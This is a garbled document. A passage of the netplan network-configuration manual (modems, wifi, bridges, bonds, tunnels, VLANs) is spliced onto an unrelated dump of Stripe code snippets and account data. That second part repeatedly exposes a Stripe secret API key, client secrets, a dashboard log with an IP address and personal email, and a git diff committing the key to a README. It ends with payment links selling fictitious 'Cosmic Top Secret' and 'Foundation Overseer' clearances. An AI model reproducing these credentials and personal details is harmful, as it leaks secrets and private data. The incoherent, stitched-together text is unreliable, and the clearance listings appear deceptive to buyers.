              of the selected Physical Function device, as identified by the given netplan id.

       Example:

              ethernets:
                enp1: {...}
                enp1s16f1:
                  link: enp1

       virtual-function-count (scalar)
              (SR-IOV devices only) In certain special cases VFs  might  need  to  be  configured
              outside   of  netplan.   For  such  configurations  virtual-function-count  can  be
              optionally used to set an explicit  number  of  Virtual  Functions  for  the  given
              Physical  Function.   If  unset,  the  default is to create only as many VFs as are
              defined in the netplan configuration.  This should be used for special cases only.

   Properties for device type modems:
       GSM/CDMA  modem  configuration  is  only  supported  for   the   NetworkManager   backend.
       systemd-networkd does not support modems.

       apn (scalar)
              Set  the  carrier  APN  (Access Point Name).  This can be omitted if auto-config is
              enabled.

       auto-config (bool)
              Specify whether to try and autoconfigure the modem by doing a lookup of the carrier
              against  the  Mobile  Broadband  Provider  database.   This  may  not  work for all
              carriers.

       device-id (scalar)
              Specify the device ID (as given by the WWAN management service)  of  the  modem  to
              match.  This can be found using mmcli.

       network-id (scalar)
              Specify the Network ID (GSM LAI format).  If this is specified, the device will not
              roam networks.

       number (scalar)
              The number to dial to establish the connection to  the  mobile  broadband  network.
              (Deprecated for GSM)

       password (scalar)
              Specify  the  password  used to authenticate with the carrier network.  This can be
              omitted if auto-config is enabled.

       pin (scalar)
              Specify the SIM PIN to allow it to operate if a PIN is set.

       sim-id (scalar)
              Specify the SIM unique identifier (as given by the WWAN management  service)  which
              this connection applies to.  If given, the connection will apply to any device also
              allowed by device-id which contains a SIM card matching the given identifier.

       sim-operator-id (scalar)
              Specify the MCC/MNC string (such as  "310260"  or  "21601")  which  identifies  the
              carrier  that this connection should apply to.  If given, the connection will apply
              to any device also allowed by device-id  and  sim-id  which  contains  a  SIM  card
              provisioned by the given operator.

       username (scalar)
              Specify  the  username  used  to authentiate with the carrier network.  This can be
              omitted if auto-config is enabled.

   Properties for device type wifis:
       Note that systemd-networkd does not natively  support  wifi,  so  you  need  wpasupplicant
       installed if you let the networkd renderer handle wifi.

       access-points (mapping)
              This provides pre-configured connections to NetworkManager.  Note that users can of
              course select other access points/SSIDs.  The keys of the mapping  are  the  SSIDs,
              and the values are mappings with the following supported properties:

              password (scalar)
                     Enable  WPA2  authentication and set the passphrase for it.  If neither this
                     nor an auth block are given, the network is assumed to be open.  The setting

                              password: "S3kr1t"

                     is equivalent to

                              auth:
                                key-management: psk
                                password: "S3kr1t"

              mode (scalar)
                     Possible access point modes are infrastructure (the default), ap (create  an
                     access  point  to  which other devices can connect), and adhoc (peer to peer
                     networks without a  central  access  point).   ap  is  only  supported  with
                     NetworkManager.

              bssid (scalar)
                     If  specified,  directs  the  device to only associate with the given access
                     point.

              band (scalar)
                     Possible bands are 5GHz (for 5GHz 802.11a) and 2.4GHz (for  2.4GHz  802.11),
                     do  not  restrict  the  802.11  frequency  band of the network if unset (the
                     default).

              channel (scalar)
                     Wireless channel to use for the Wi-Fi connection.  Because  channel  numbers
                     overlap  between bands, this property takes effect only if the band property
                     is also set.

       wakeonwlan (sequence of scalars)
              This enables WakeOnWLan on supported devices.  Not all drivers support all options.
              May   be   any   combination  of  any,  disconnect,  magic_pkt,  gtk_rekey_failure,
              eap_identity_req, four_way_handshake, rfkill_release or tcp (NetworkManager  only).
              Or the exclusive default flag (the default).

   Properties for device type bridges:
       interfaces (sequence of scalars)
              All  devices  matching  this  ID  list will be added to the bridge.  This may be an
              empty list, in which case  the  bridge  will  be  brought  online  with  no  member
              interfaces.

              Example:

                       ethernets:
                         switchports:
                           match: {name: "enp2*"}
                       [...]
                       bridges:
                         br0:
                           interfaces: [switchports]

       parameters (mapping)
              Customization  parameters for special bridging options.  Time intervals may need to
              be expressed as a number of seconds or milliseconds:  the  default  value  type  is
              specified below.  If necessary, time intervals can be qualified using a time suffix
              (such as "s" for seconds, "ms" for milliseconds) to allow for more control over its
              behavior.

              ageing-time (scalar)
                     Set  the  period  of  time  to keep a MAC address in the forwarding database
                     after a packet is received.  This maps to the AgeingTimeSec=  property  when
                     the  networkd  renderer  is used.  If no time suffix is specified, the value
                     will be interpreted as seconds.

              priority (scalar)
                     Set the priority value for the  bridge.   This  value  should  be  a  number
                     between  0  and  65535.  Lower values mean higher priority.  The bridge with
                     the higher priority will be elected as the root bridge.

              port-priority (scalar)
                     Set the port priority to .  The priority value is a number between 0 and 63.
                     This  metric  is  used  in  the  designated  port  and  root  port selection
                     algorithms.

              forward-delay (scalar)
                     Specify the period of time the bridge will remain in Listening and  Learning
                     states  before  getting  to  the  Forwarding  state.  This field maps to the
                     ForwardDelaySec= property for the networkd renderer.  If no time  suffix  is
                     specified, the value will be interpreted as seconds.

              hello-time (scalar)
                     Specify  the interval between two hello packets being sent out from the root
                     and designated bridges.  Hello packets  communicate  information  about  the
                     network  topology.   When  the  networkd  renderer is used, this maps to the
                     HelloTimeSec= property.  If no time suffix is specified, the value  will  be
                     interpreted as seconds.

              max-age (scalar)
                     Set  the  maximum  age of a hello packet.  If the last hello packet is older
                     than that value, the bridge will attempt to become the  root  bridge.   This
                     maps  to  the MaxAgeSec= property when the networkd renderer is used.  If no
                     time suffix is specified, the value will be interpreted as seconds.

              path-cost (scalar)
                     Set the cost of a path on the bridge.  Faster interfaces should have a lower
                     cost.   This  allows  a  finer  control  on the network topology so that the
                     fastest paths are available whenever possible.

              stp (bool)
                     Define whether the bridge should use Spanning Tree  Protocol.   The  default
                     value is "true", which means that Spanning Tree should be used.

   Properties for device type bonds:
       interfaces (sequence of scalars)
              All devices matching this ID list will be added to the bond.

              Example:

                       ethernets:
                         switchports:
                           match: {name: "enp2*"}
                       [...]
                       bonds:
                         bond0:
                           interfaces: [switchports]

       parameters (mapping)
              Customization  parameters  for special bonding options.  Time intervals may need to
              be expressed as a number of seconds or milliseconds:  the  default  value  type  is
              specified below.  If necessary, time intervals can be qualified using a time suffix
              (such as "s" for seconds, "ms" for milliseconds) to allow for more control over its
              behavior.

              mode (scalar)
                     Set  the  bonding  mode  used for the interfaces.  The default is balance-rr
                     (round robin).  Possible values are balance-rr, active-backup,  balance-xor,
                     broadcast, 802.3ad, balance-tlb, and balance-alb.

              lacp-rate (scalar)
                     Set  the  rate  at  which  LACPDUs  are transmitted.  This is only useful in
                     802.3ad mode.  Possible values are slow  (30  seconds,  default),  and  fast
                     (every second).

              mii-monitor-interval (scalar)
                     Specifies  the interval for MII monitoring (verifying if an interface of the
                     bond has carrier).  The default is 0; which disables MII  monitoring.   This
                     is  equivalent  to the MIIMonitorSec= field for the networkd backend.  If no
                     time suffix is specified, the value will be interpreted as milliseconds.

              min-links (scalar)
                     The minimum number of links up in a bond to consider the bond  interface  to
                     be up.

              transmit-hash-policy (scalar)
                     Specifies  the  transmit  hash  policy for the selection of slaves.  This is
                     only useful in balance-xor, 802.3ad and balance-tlb modes.  Possible  values
                     are layer2, layer3+4, layer2+3, encap2+3, and encap3+4.

              ad-select (scalar)
                     Set  the aggregation selection mode.  Possible values are stable, bandwidth,
                     and count.  This option is only used in 802.3ad mode.

              all-slaves-active (bool)
                     If the bond should drop duplicate frames received  on  inactive  ports,  set
                     this option to false.  If they should be delivered, set this option to true.
                     The  default  value  is  false,  and  is  the  desirable  behavior  in  most
                     situations.

              arp-interval (scalar)
                     Set the interval value for how frequently ARP link monitoring should happen.
                     The default value is 0, which disables ARP  monitoring.   For  the  networkd
                     backend,  this  maps  to the ARPIntervalSec= property.  If no time suffix is
                     specified, the value will be interpreted as milliseconds.

              arp-ip-targets (sequence of scalars)
                     IPs of other hosts on the link which should be sent ARP requests in order to
                     validate  that a slave is up.  This option is only used when arp-interval is
                     set to a value other than 0.  At least one IP address must be given for  ARP
                     link  monitoring  to  function.  Only IPv4 addresses are supported.  You can
                     specify up to 16 IP addresses.  The default value is an empty list.

              arp-validate (scalar)
                     Configure  how  ARP  replies  are  to  be  validated  when  using  ARP  link
                     monitoring.  Possible values are none, active, backup, and all.

              arp-all-targets (scalar)
                     Specify  whether to use any ARP IP target being up as sufficient for a slave
                     to be considered up; or if all the targets must be up.  This  is  only  used
                     for  active-backup  mode  when arp-validate is enabled.  Possible values are
                     any and all.

              up-delay (scalar)
                     Specify the delay before enabling a link once the  link  is  physically  up.
                     The  default  value  is  0.   This  maps to the UpDelaySec= property for the
                     networkd renderer.  This option is only valid for the miimon  link  monitor.
                     If   no  time  suffix  is  specified,  the  value  will  be  interpreted  as
                     milliseconds.

              down-delay (scalar)
                     Specify the delay before disabling a link once the link has been lost.   The
                     default  value  is  0.   This  maps  to  the  DownDelaySec= property for the
                     networkd renderer.  This option is only valid for the miimon  link  monitor.
                     If   no  time  suffix  is  specified,  the  value  will  be  interpreted  as
                     milliseconds.

              fail-over-mac-policy (scalar)
                     Set whether to set all slaves to the same MAC address when  adding  them  to
                     the  bond, or how else the system should handle MAC addresses.  The possible
                     values are none, active, and follow.

              gratuitous-arp (scalar)
                     Specify how many ARP packets to send after failover.  Once a link is up on a
                     new slave, a notification is sent and possibly repeated if this value is set
                     to a number greater than 1.  The default value is 1  and  valid  values  are
                     between 1 and 255.  This only affects active-backup mode.

                     For historical reasons, the misspelling gratuitious-arp is also accepted and
                     has the same function.

              packets-per-slave (scalar)
                     In balance-rr mode, specifies the number of packets to transmit on  a  slave
                     before  switching  to  the  next.   When  this value is set to 0, slaves are
                     chosen at random.  Allowable values are between 0 and  65535.   The  default
                     value is 1.  This setting is only used in balance-rr mode.

              primary-reselect-policy (scalar)
                     Set  the reselection policy for the primary slave.  On failure of the active
                     slave, the system will use this policy to decide how the  new  active  slave
                     will  be  chosen  and how recovery will be handled.  The possible values are
                     always, better, and failure.

              resend-igmp (scalar)
                     In modes balance-rr, active-backup, balance-tlb and balance-alb, a  failover
                     can switch IGMP traffic from one slave to another.

                     This  parameter  specifies  how many IGMP membership reports are issued on a
                     failover event.  Values range from 0 to 255.  0 disables sending  membership
                     reports.   Otherwise,  the  first  membership report is sent on failover and
                     subsequent reports are sent at 200ms intervals.

              learn-packet-interval (scalar)
                     Specify the interval between sending learning packets to  each  slave.   The
                     value  range  is  between  1  and 0x7fffffff.  The default value is 1.  This
                     option only affects balance-tlb and balance-alb modes.  Using  the  networkd
                     renderer,  this  field  maps to the LearnPacketIntervalSec= property.  If no
                     time suffix is specified, the value will be interpreted as seconds.

              primary (scalar)
                     Specify a device to be used as a primary slave, or preferred device  to  use
                     as  a  slave  for the bond (ie.  the preferred device to send data through),
                     whenever it is available.  This only affects active-backup, balance-alb, and
                     balance-tlb modes.

   Properties for device type tunnels:
       Tunnels  allow  traffic  to  pass  as if it was between systems on the same local network,
       although systems may be far from each other but reachable via the Internet.  They  may  be
       used  to  support IPv6 traffic on a network where the ISP does not provide the service, or
       to    extend    and     "connect"     separate     local     networks.      Please     see
       https://en.wikipedia.org/wiki/Tunneling_protocol   for   more  general  information  about
       tunnels.

       mode (scalar)
              Defines the tunnel mode.  Valid options are sit, gre, ip6gre, ipip, ipip6,  ip6ip6,
              vti,  and  vti6.   Additionally,  the  networkd  backend  also  supports gretap and
              ip6gretap modes.  In addition, the NetworkManager backend supports isatap tunnels.

       local (scalar)
              Defines the address of the local endpoint of the tunnel.

       remote (scalar)
              Defines the address of the remote endpoint of the tunnel.

       key (scalar or mapping)
              Define keys to use for the tunnel.  The key can be a number or a  dotted  quad  (an
              IPv4  address).   It  is  used  for  identification of IP transforms.  This is only
              required for vti and vti6 when using the networkd backend, and for  gre  or  ip6gre
              tunnels when using the NetworkManager backend.

              This  field  may be used as a scalar (meaning that a single key is specified and to
              be used for both input and output key), or as a mapping, where you can then further
              specify input and output.

              input (scalar)
                     The input key for the tunnel

              output (scalar)
                     The output key for the tunnel

       Examples:

              tunnels:
                tun0:
                  mode: gre
                  local: ...
                  remote: ...
                  keys:
                    input: 1234
                    output: 5678

              tunnels:
                tun0:
                  mode: vti6
                  local: ...
                  remote: ...
                  key: 59568549

       keys (scalar or mapping)
              Alternate name for the key field.  See above.

   Properties for device type vlans:
       id (scalar)
              VLAN ID, a number between 0 and 4094.

       link (scalar)
              netplan ID of the underlying device definition on which this VLAN gets created.

       Example:

              ethernets:
                eno1: {...}
              vlans:
                en-intra:
                  id: 1
                  link: eno1
                  dhcp4: yes
                en-vpn:
                  id: 2
                  link: eno1
                  addresses: ...

   Backend-specific configuration parameters
       In  addition  to  the  other  fields  available to configure interfaces, some backends may
       require to record some of their own parameters  in  netplan,  especially  if  the  netplan
       definitions  are generated automatically by the consumer of that backend.  Currently, this
       is only used with NetworkManager.

       networkmanager (mapping)
              Keeps the NetworkManager-specific configuration parameters used by  the  daemon  to
              recognize connections.

              name (scalar)
                     Set the display name for the connection.

              uuid (scalar)
                     Defines  the  UUID  (unique identifier) for this connection, as generated by
                     NetworkManager itself.

              stable-id (scalar)
                     Defines the stable ID (a different  form  of  a  connection  name)  used  by
                     NetworkManager  in  case  the name of the connection might otherwise change,
                     such as when sharing connections between users.

              device (scalar)
                     Defines the interface name for which this connection applies.

   Examples
       Configure an ethernet device with networkd, identified by its name, and enable DHCP:

              network:
                version: 2
                ethernets:
                  eno1:
                    dhcp4: true

       This is an example of a static-configured  interface  with  multiple  IPv4  addresses  and
       multiple  gateways  with  networkd,  with  equal  route  metric  levels,  and  static  DNS
       nameservers (Google DNS for this example):

              network:
                version: 2
                renderer: networkd
                ethernets:
                  eno1:
                    addresses:
                    - 10.0.0.10/24
                    - 11.0.0.11/24
                    nameservers:
                      addresses:
                        - 8.8.8.8
                        - 8.8.4.4
                    routes:
                    - to: 0.0.0.0/0
                      via: 10.0.0.1
                      metric: 100
                    - to: 0.0.0.0/0
                      via: 11.0.0.1
                      metric: 100

       This is a complex example which shows most available features:

              network:
                version: 2
                # if specified, can only realistically have that value, as networkd cannot
                # render wifi/3G.
                renderer: NetworkManager
                ethernets:
                  # opaque ID for physical interfaces, only referred to by other stanzas
                  id0:
                    match:
                      macaddress: 00:11:22:33:44:55
                    wakeonlan: true
                    dhcp4: true
                    addresses:
                      - 192.168.14.2/24
                      - 192.168.14.3/24
                      - "2001:1::1/64"
                    gateway4: 192.168.14.1
                    gateway6: "2001:1::2"
                    nameservers:
                      search: [foo.local, bar.local]
                      addresses: [8.8.8.8]
                    routes:
                      - to: 0.0.0.0/0
                        via: 11.0.0.1
                        table: 70
                        on-link: true
                        metric: 3
                    routing-policy:
                      - to: 10.0.0.0/8
                        from: 192.168.14.2/24
                        table: 70
                        priority: 100
                      - to: 20.0.0.0/8
                        from: 192.168.14.3/24
                        table: 70
                        priority: 50
                    # only networkd can render on-link routes and routing policies
                    renderer: networkd
                  lom:
                    match:
                      driver: ixgbe
                    # you are responsible for setting tight enough match rules
                    # that only match one device if you use set-name
                    set-name: lom1
                    dhcp6: true
                  switchports:
                    # all cards on second PCI bus unconfigured by
                    # themselves, will be added to br0 below
                    # note: globbing is not supported by NetworkManager
                    match:
                      name: enp2*
                    mtu: 1280
                wifis:
                  all-wlans:
                    # useful on a system where you know there is
                    # only ever going to be one device
                    match: {}
                    access-points:
                      "Joe's home":
                        # mode defaults to "infrastructure" (client)
                        password: "s3kr1t"
                  # this creates an AP on wlp1s0 using hostapd
                  # no match rules, thus the ID is the interface name
                  wlp1s0:
                    access-points:
                      "guest":
                         mode: ap
                         # no WPA config implies default of open
                bridges:
                  # the key name is the name for virtual (created) interfaces
                  # no match: and set-name: allowed
                  br0:
                    # IDs of the components; switchports expands into multiple interfaces
                    interfaces: [wlp1s0, switchports]
                    dhcp4: true

  if (elements == null) {
  return;
}

// Trigger form validation and wallet collection
const {error: submitError} = await elements.submit();
if (submitError) {
  // Show error to your customer
  setErrorMessage(submitError.message);
  return;
}

// Create the PaymentIntent and obtain clientSecret from your server endpoint
const res = await fetch('/create-intent', {
  method: 'POST',
});

const {client_secret: seti_1NG8Du2eZvKYlo2C9XMqbR0x_secret_O2CdhLwGFh2Aej7bCY7qp8jlIuyR8DJ} = await res.json();

const {error} = await stripe.confirmPayment({
  //`Elements` instance that was used to create the Payment Element
  elements,
  clientSecret,
  confirmParams: {
    return_url: 'https://example.com/order/123/complete',
  },
});

if (error) {
  // This point will only be reached if there is an immediate error when
  // confirming the payment. Show error to your customer (for example, payment
  // details incomplete)
  setErrorMessage(error.message);
} else {
  // Your customer will be redirected to your `return_url`. For some payment
  // methods like iDEAL, your customer will be redirected to an intermediate
  // site first to authorize the payment, then redirected to the `return_url`.
}
import stripe
stripe.api_key = "sk_test_51OR5eP...OF00CdDfT6Xqsk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
stripe.Event.list(limit=3)
RESPONSE
{
  "object": "list",
  "url": "/v1/events",
  "has_more": false,
  "data": [
    {
      "id": "evt_1NG8Du2eZvKYlo2CUI79vXWy",
      "object": "event",
      "api_version": "2019-02-19",
      "created": 1686089970,
      "data": {
        "object": {
          "id": "seti_1NG8Du2eZvKYlo2C9XMqbR0x",
          "object": "setup_intent",
          "application": null,
          "automatic_payment_methods": null,
          "cancellation_reason": null,
          "client_secret": "seti_1NG8Du2eZvKYlo2C9XMqbR0x_secret_O2CdhLwGFh2Aej7bCY7qp8jlIuyR8DJ",
          "created": 1686089970,
          "customer": null,
          "description": null,
          "flow_directions": null,
          "last_setup_error": null,
          "latest_attempt": null,
          "livemode": false,
          "mandate": null,
          "metadata": {},
          "next_action": null,
          "on_behalf_of": null,
          "payment_method": "pm_1NG8Du2eZvKYlo2CYzzldNr7",
          "payment_method_options": {
            "acss_debit": {
              "currency": "cad",
              "mandate_options": {
                "interval_description": "First day of every month",
                "payment_schedule": "interval",
                "transaction_type": "personal"
              },
              "verification_method": "automatic"
            }
          },
          "payment_method_types": [
            "acss_debit"
          ],
          "single_use_mandate": null,
          "status": "requires_confirmation",
          "usage": "off_session"
        }
      },
      "livemode": false,
      "pending_webhooks": 0,
      "request": {
        "id": null,
        "idempotency_key": null
      },
      "type": "setup_intent.created"
    }
    {...}
    {...}
  ],
}

  OK
ID
req_ZIIVfKfNp6QrOh
Time
12/27/23, 8:29:28 PM
IP address
73.44.108.236 (from server at 73.44.108.236)
API version
2023-08-16
Latest
Source
Dashboard — grateful345i@gmail.com
Idempotency
Key — 6f5410cb-1ecc-4302-8130-baf8dd8c0a50

Origin
https://dashboard.stripe.com/
Response body
{
  "id": "prod_PFteovqxmPdK9u"
}
Request query parameters
{
  "include_only": [
    "id"
  ]
}
Request POST body
{
  "statement_descriptor": "Foundation Overseer ",
  "unit_label": "US-dollar "
}
stripe.collectFinancialConnectionsAccounts({
  clientSecret: '{fcsess_client_secret_KRJTKvCY3IKoYTrW18EazcO3}'
})
  .then(function(result) {
    if (result.error) {
      // Inform the customer that there was an error.
      console.log(result.error.message);

    // Handle next step based on length of accounts array
    } else if (result.financialConnectionsSession.accounts.length === 0) {
      console.log('No accounts were linked');
    } else {
      console.log(result.financialConnectionsSession.accounts)
    }
  });

{
  "object": "customer_session",
  "client_secret": "_POpxYpmkXdtttYtZQYhrsOJZ2RCQ9kCqqXRU6qrP5c4Jgje",
  "components": {
    "buy_button": {
      "enabled": false
    },
    "pricing_table": {
      "enabled": true
    }
  },
  "customer": "cus_PO34b57IOUb83c",
  "expires_at": 1684790027,
  "livemode": false
} {
  "object": "customer_session",
  "client_secret": "_POpxYpmkXdtttYtZQYhrsOJZ2RCQ9kCqqXRU6qrP5c4Jgje",
  "components": {
    "buy_button": {
      "enabled": false
    },
    "pricing_table": {
      "enabled": true
    }
  },
  "customer": "cus_PO34b57IOUb83c",
  "expires_at": 1684790027,
  "livemode": false
}
  topup_specialist

financial_connections_specialist

data_migration_specialist

dispute_analyst

dispute_analyst

issuing_support_agent

identity_view_only

identity_analyst

developer

transfer_analyst

iam_admin

admin

Config ID: pmc_1OR5vsGF83d3fsgWzmnkEVzu

pmc_1OeEwHGF83d3fsgWmcx4vJ5r

pmc_1OeEqTGF83d3fsgWIqEYV0K1
   
   txi_1Omd5MGF83d3fsgWxIHULLcs object id gods time 

txi_1OT14cGF83d3fsgWupcH0pyK
Object id Keith Bieszczat’s sr
txi_1Omd5MGF83d3fsgWxIHULLcs object id gods time 

txi_1OT14cGF83d3fsgWupcH0pyK
Object id Keith Bieszczat’s sr

253-primary-key

Commits on Feb 22, 2024
Update README.md 
@6309304695 Grateful@Grateful000006.onmicrosoft.com

git fetch origin
git checkout 253-primary-
  
npm i @stripe/react-stripe-js
txi_1Omd5MGF83d3fsgWxIHULLcs object id gods time 

txi_1OT14cGF83d3fsgWupcH0pyK
Object id Keith Bieszczat’s sr

# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
import stripe
stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"

stripe.PaymentIntent.create(
  amount=1099,
  currency="usd",
  payment_method_types=["card"],
  statement_descriptor_suffix="example descriptor",
)
# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
import stripe
stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
// Create the Address Element in shipping mode
var addressElement = elements.create('address', {
  mode: 'shipping',
});
{
  "id": "pm_1MqLiJLkdIwHu7ixUEgbFdYF",
  "object": "payment_method",
  "billing_details": {
    "address": {
      "city": null,
      "country": null,
      "line1": null,
      "line2": null,
      "postal_code": null,
      "state": null
    },
    "email": null,
    "name": null,
    "phone": null
  },
  "card": {
    "brand": "visa",
    "checks": {
      "address_line1_check": null,
      "address_postal_code_check": null,
      "cvc_check": "unchecked"
    },
    "country": "US",
    "exp_month": 8,
    "exp_year": 2026,
    "fingerprint": "mToisGZ01V71BCos",
    "funding": "credit",
    "generated_from": null,
    "last4": "4242",
    "networks": {
      "available": [
        "visa"
      ],
      "preferred": null
    },
    "three_d_secure_usage": {
      "supported": true
    },
    "wallet": null
  },
  "created": 1679945299,
  "customer": null,
  "livemode": false,
  "metadata": {},
  "type": "card"
}
Create
// Create the Address Element in billing mode
var addressElement = elements.create('address', {
  mode: 'billing',
});
var addressElement = elements.getElement('address');
var addressElement = elements.getElement('address');
var addressElement = elements.getElement('address');

addressElement.getValue()
.then(function(result) {
  if (result.complete) {
    // Allow user to proceed to the next step
    // Optionally, use value to store the address details
  }
})
const element = elements.create('issuingCardNumberDisplay', {
  issuingCard: 'ic_1ITi6XKYfU8ZP6raDAXem8ql',
  nonce: 'ephkn_priv_v9QGxPyA1F1VHjB4dpLhHfw4',
  ephemeralKeySecret: 'ek_live_YWNjdF8xSmtzQWtQbUd...',
});
var cardElement = elements.getElement('card');
// Update an element with details collected elsewhere on your page
var myPostalCodeField = document.querySelector('input[name="60126"]');
myPostalCodeField.addEventListener('change', function(event) {
  cardElement.update({value: {postalCode: event.target.value}});
});

// Dynamically change the styles of an element
window.addEventListener('resize', function(event) {
  if (window.innerWidth <= 320) {
    cardElement.update({style: {base: {fontSize: '13px'}}});
  } else {
    cardElement.update({style: {base: {fontSize: '16px'}}});
  }
});
// Update an element with details collected elsewhere on your page
var myPostalCodeField = document.querySelector('input[name="60126"]');
myPostalCodeField.addEventListener('change', function(event) {
  cardElement.update({value: {postalCode: event.target.value}});
});

// Dynamically change the styles of an element
window.addEventListener('resize', function(event) {
  if (window.innerWidth <= 320) {
    cardElement.update({style: {base: {fontSize: '13px'}}});
  } else {
    cardElement.update({style: {base: {fontSize: '16px'}}});
  }
});
stripe.PaymentIntent.create(
  amount=1000,
  currency="usd",
  automatic_payment_methods={"enabled": True},
  stripe_account="{{CONNECTED_ACCOUNT_ID}}",
)


# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
import stripe
stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"

stripe.PaymentIntent.create(
  amount=1099,
  currency="usd",
  payment_method_types=["card"],
  statement_descriptor_suffix="example descriptor",
)
---
 README.md | 12 ++++++++++++
 1 file changed, 12 insertions(+)

diff --git a/README.md b/README.md
index c379591..caa69e5 100644
--- a/README.md
+++ b/README.md
@@ -4,6 +4,18 @@ txi_1Omd5MGF83d3fsgWxIHULLcs object id gods time
 
 txi_1OT14cGF83d3fsgWupcH0pyK
 Object id Keith Bieszczat’s sr
+
+# Set your secret key. Remember to switch to your live secret key in production.
+# See your keys here: https://dashboard.stripe.com/apikeys
+import stripe
+stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
+
+stripe.PaymentIntent.create(
+  amount=1099,
+  currency="usd",
+  payment_method_types=["card"],
+  statement_descriptor_suffix="example descriptor",
+)
 # Set your secret key. Remember to switch to your live secret key in production.
 # See your keys here: https://dashboard.stripe.com/apikeys
 import stripe
# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")

# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")

client.payment_intents.create({
  "amount": 1000,
  "currency": "jpy",
  "payment_method_types": ["card"],
  "statement_descriptor_suffix": "example descriptor",
  "payment_method_options": {
    "card": {
      "statement_descriptor_suffix_kanji": "漢字サフィックス",
      "statement_descriptor_suffix_kana": "カナサフィックス",
    },
  },
})

# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")
<!-- Mount the instance within a <label> -->
<label>Card
  <div id="card-element"></div>
</label>

<!--
  Or create a <label> with a 'for' attribute,
  referencing the ID of your container.
-->
<label for="card-element">Card</label>
<div id="card-element"></div>

<script>
  cardElement.mount('#card-element');
</script>
cardElement.destroy();
client.transfers.reversals.create(
  "{{TRANSFER_ID}}",
  {"amount": 500},
)
# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
import stripe
stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"
paymentElement.on('change', function(event) {
  if (event.complete) {
    // enable payment button
  }
});
{
  elementType: 'payment',
  complete: false,
  empty: false,
  collapsed: false,
  value: { type: "card" },
}
element.on('ready', function(event) {
  // Handle ready event
});
stripe.Transfer.create_reversal(
  "{{TRANSFER_ID}}",
  amount=500,
)
{
  "id": "trr_1Mio2eLkdIwHu7ixN5LPJS4a",
  "object": "transfer_reversal",
  "amount": 400,
  "balance_transaction": "txn_1Mio2eLkdIwHu7ixosfrbjhW",
  "created": 1678147568,
  "currency": "usd",
  "destination_payment_refund": "pyr_1Mio2eQ9PRzxEwkZYewpaIFB",
  "metadata": {},
  "source_refund": null,
  "transfer": "tr_1Mio2dLkdIwHu7ixsUuCxJpu"
}
id Created (UTC) Active Currency Url Name
plink_1Od1GrGF83d3fsgWPBZMj1dS 2024-01-27 02:05 true usd https://buy.stripe.com/7sIdR2exD6XXgMw7sM Level 6 Advanced Signal Operator clearance
plink_1OX7UYGF83d3fsgWzgP53hmY 2024-01-10 19:31 true usd https://buy.stripe.com/28o9AM0GN3LL53OdR9 MIB computational clearance
plink_1OVQUnGF83d3fsgWzAt0yazb 2024-01-06 03:24 true usd https://buy.stripe.com/bIY8wIcpv6XXbsc5kC Level 5 computational security clearance.
plink_1OVM4OGF83d3fsgWtmstHvvF 2024-01-05 22:40 true usd https://buy.stripe.com/9AQaEQ9djfut3ZK3ct Cosmic Top Secret
plink_1OVM1hGF83d3fsgW4IUOYogW 2024-01-05 22:38 true usd https://buy.stripe.com/7sIdR2ahneqp2VG14k MIB computational clearance
plink_1OVLuwGF83d3fsgWqe7RW2Dv 2024-01-05 22:31 true usd https://buy.stripe.com/bIY9AMcpvdml7bWbIX Foundation Overseer Clearance
plink_1OVLetGF83d3fsgWyCEZ0jeS 2024-01-05 22:14 true usd https://buy.stripe.com/aEUbIUblr1DDdAk3cq Foundation Overseer Clearance
plink_1OTYcwGF83d3fsgWTbbaph5S 2023-12-31 23:41 true usd https://buy.stripe.com/aEU00cblr1DD0Ny4gt Cosmic Top Secret
plink_1OT1OyGF83d3fsgWpdUQRkqS 2023-12-30 12:12 true usd https://buy.stripe.com/6oEfZafBHbed0Ny28k MIB computational clearance
plink_1OT1DBGF83d3fsgWrf7A60sV 2023-12-30 12:00 true usd https://buy.stripe.com/bIY8wI1KRbedao85kv MIB computational clearance
plink_1OSBfuGF83d3fsgWCgxsnehE 2023-12-28 04:58 true usd https://buy.stripe.com/8wM9AMgFLfut1RCaEO Level 6 Advanced Signal Operator clearance
